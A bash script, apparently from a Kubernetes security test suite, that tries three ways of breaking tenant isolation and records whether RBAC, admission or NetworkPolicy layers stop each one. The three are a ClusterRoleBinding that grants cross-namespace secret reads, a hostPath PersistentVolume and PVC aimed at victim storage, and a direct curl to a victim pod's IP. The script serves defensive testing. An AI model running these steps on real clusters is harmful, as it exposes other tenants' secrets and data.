#!/usr/bin/env bash
# =============================================================================
# ATTACK A1 — Isolation Bypass
# Doc class : A1  |  Script: attack1.sh
# Spec      : Rev5 Section 13
# Objective : breach tenant isolation boundary to read another tenant's data
#
# Techniques (spec-aligned):
#   T1 — ClusterRoleBinding  Misconfigured CRB granting cross-namespace read
#   T2 — PVC/PV Mismatch     Shared PVC mount via mismatched binding
#   T3 — Direct Pod-to-Pod   Network-based direct pod-to-pod API call
#
# Primary defenders:
#   T1 → L3a (RBAC blocks cross-ns read via CRB)
#   T2 → L4  (tenant isolation prevents cross-ns PVC binding)
#   T3 → L5  (NetworkPolicy blocks direct pod-to-pod traffic)
#
# Output: SUCCESS|<technique>|<detail>
#         BLOCKED|<technique>|<detail>
#         SKIP|<reason>
# =============================================================================
set -euo pipefail

ATTACKER_NS="${ATTACKER_NS:-tenant-lowpriv}"
VICTIM_NS="${VICTIM_NS:-tenant-finserv}"
SEED="${SEED:-$$}"

succeed() { echo "SUCCESS|$1|$2"; exit 0; }
blocked() { echo "BLOCKED|$1|$2"; exit 1; }
skip()    { echo "SKIP|$1";       exit 2; }

TECHNIQUES=(t1-crb-cross-namespace t2-pvc-mismatch t3-direct-pod-api)
N_TECH=${#TECHNIQUES[@]}
: "${TECHNIQUE_IDX:?TECHNIQUE_IDX env var required}"
[[ "$TECHNIQUE_IDX" -lt 0 || "$TECHNIQUE_IDX" -ge "$N_TECH" ]] && {
  echo "SKIP|TECHNIQUE_IDX-out-of-range-$TECHNIQUE_IDX"; exit 2; }
TECHNIQUE="${TECHNIQUES[$TECHNIQUE_IDX]}"
echo "[A1] SEED=$SEED TECHNIQUE_IDX=$TECHNIQUE_IDX technique=$TECHNIQUE"

CRB_NAME="a1-crb-$$"
PVC_NAME="a1-pvc-$$"
PV_NAME="a1-pv-$$"
POD_NAME="a1-pod-$$"

cleanup() {
  kubectl delete clusterrolebinding "$CRB_NAME" --ignore-not-found 2>/dev/null || true
  kubectl delete pvc "$PVC_NAME" -n "$ATTACKER_NS" --ignore-not-found 2>/dev/null || true
  kubectl delete pv "$PV_NAME" --ignore-not-found 2>/dev/null || true
  kubectl delete pod "$POD_NAME" -n "$ATTACKER_NS" --ignore-not-found --grace-period=0 2>/dev/null || true
}
trap cleanup EXIT

ATTACKER_POD=$(kubectl get pod -n "$ATTACKER_NS" -l app=client \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)

case "$TECHNIQUE" in

  t1-crb-cross-namespace)
    # Create a CRB that grants attacker SA cross-namespace secret read
    # Success = attacker can list victim namespace secrets via the misconfigured binding
    # Blocked by L3a: RBAC rejects the CRB creation or the subsequent read
    echo "[A1-t1] creating misconfigured CRB granting $ATTACKER_NS:default cross-ns read"
    CRB_OUT=$(kubectl create clusterrolebinding "$CRB_NAME" \
      --clusterrole=view \
      --serviceaccount="${ATTACKER_NS}:default" 2>&1 || echo "DENIED")
    echo "[A1-t1] CRB result: $CRB_OUT"

    if echo "$CRB_OUT" | grep -qi "denied\|forbidden\|error"; then
      blocked "t1-crb-cross-namespace" "rbac-denied-crb-creation"
    fi

    # CRB created — now use it to read victim namespace secrets
    SECRETS=$(kubectl get secrets -n "$VICTIM_NS" \
      --as="system:serviceaccount:${ATTACKER_NS}:default" \
      --no-headers 2>/dev/null | wc -l || echo "0")
    SECRETS="${SECRETS:-0}"
    echo "[A1-t1] secrets readable in $VICTIM_NS: $SECRETS"
    [[ "$SECRETS" -gt 0 ]] \
      && succeed "t1-crb-cross-namespace" "secrets-readable=$SECRETS ns=$VICTIM_NS" \
      || blocked "t1-crb-cross-namespace" "rbac-denied-read secrets=0"
    ;;

  t2-pvc-mismatch)
    # Create a PV and PVC in attacker namespace that claims victim namespace storage
    # Success = PVC binds and pod mounts it, reading victim data
    # Blocked by L4: tenant isolation prevents cross-namespace PV binding
    echo "[A1-t2] creating PV/PVC mismatch targeting $VICTIM_NS storage path"

    PV_APPLY=$(kubectl apply -f - 2>&1 <<EOF || echo "DENIED"
apiVersion: v1
kind: PersistentVolume
metadata:
  name: $PV_NAME
  labels:
    attack-artifact: "true"
spec:
  capacity:
    storage: 1Mi
  accessModes: [ReadWriteOnce]
  hostPath:
    path: /tmp/victim-data-$$
  claimRef:
    namespace: $ATTACKER_NS
    name: $PVC_NAME
  persistentVolumeReclaimPolicy: Delete
EOF
)
    echo "[A1-t2] PV: $PV_APPLY"
    if echo "$PV_APPLY" | grep -qi "denied\|forbidden\|error"; then
      blocked "t2-pvc-mismatch" "admission-denied-pv-creation"
    fi

    PVC_APPLY=$(kubectl apply -f - 2>&1 <<EOF || echo "DENIED"
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: $PVC_NAME
  namespace: $ATTACKER_NS
  labels:
    attack-artifact: "true"
spec:
  accessModes: [ReadWriteOnce]
  resources:
    requests:
      storage: 1Mi
  volumeName: $PV_NAME
EOF
)
    echo "[A1-t2] PVC: $PVC_APPLY"
    if echo "$PVC_APPLY" | grep -qi "denied\|forbidden\|error"; then
      blocked "t2-pvc-mismatch" "admission-denied-pvc-creation"
    fi

    # Wait for PVC to bind
    for i in $(seq 1 10); do
      STATUS=$(kubectl get pvc "$PVC_NAME" -n "$ATTACKER_NS" \
        -o jsonpath='{.status.phase}' 2>/dev/null || echo "Unknown")
      echo "[A1-t2] PVC status: $STATUS (attempt $i)"
      [[ "$STATUS" == "Bound" ]] && break
      sleep 1
    done

    STATUS=$(kubectl get pvc "$PVC_NAME" -n "$ATTACKER_NS" \
      -o jsonpath='{.status.phase}' 2>/dev/null || echo "Unknown")
    [[ "$STATUS" == "Bound" ]] \
      && succeed "t2-pvc-mismatch" "pvc-bound cross-ns-storage-accessible" \
      || blocked "t2-pvc-mismatch" "pvc-not-bound status=$STATUS tenant-isolation-active"
    ;;

  t3-direct-pod-api)
    # Direct pod-to-pod API call bypassing service boundaries
    # Get victim pod IP directly and call it without going through the service
    # Success = direct pod IP reachable cross-tenant
    # Blocked by L5: NetworkPolicy default-deny blocks direct pod-to-pod traffic
    [[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"

    echo "[A1-t3] getting victim pod IP directly (bypassing service)"
    VICTIM_POD_IP=$(kubectl get pod -n "$VICTIM_NS" -l app=productpage \
      -o jsonpath='{.items[0].status.podIP}' 2>/dev/null || true)
    [[ -z "$VICTIM_POD_IP" ]] && skip "no-victim-pod-ip-in-$VICTIM_NS"

    echo "[A1-t3] calling victim pod directly at $VICTIM_POD_IP:9080 (bypassing service)"
    HTTP_CODE=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
      "http://${VICTIM_POD_IP}:9080/productpage" 2>/dev/null || echo "000")
    echo "[A1-t3] direct pod-to-pod HTTP: $HTTP_CODE"
    [[ "$HTTP_CODE" =~ ^[2-3][0-9][0-9]$ ]] \
      && succeed "t3-direct-pod-api" "direct-pod-reachable ip=$VICTIM_POD_IP http=$HTTP_CODE" \
      || blocked "t3-direct-pod-api" "netpol-blocked http=$HTTP_CODE"
    ;;

  *)
    skip "unknown-technique-$TECHNIQUE"
    ;;
esac
